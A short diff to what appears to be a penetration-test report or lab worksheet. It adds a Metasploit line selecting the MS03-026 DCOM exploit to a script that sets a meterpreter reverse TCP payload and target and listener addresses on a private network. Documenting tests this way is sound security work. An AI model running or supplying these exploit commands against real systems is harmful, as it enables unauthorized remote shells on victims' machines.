@@ -12,7 +12,8 @@ Fill out below as appropriate.
 
 The system is exploitable:
 	B: Below is an MSF script to exploit it
-
+		
+		use exploit/windows/dcerpc/ms03_026_dcom
 		set PAYLOAD windows/meterpreter/reverse_tcp
 		set RHOST 192.168.0.33
 		set LHOST 192.168.0.129
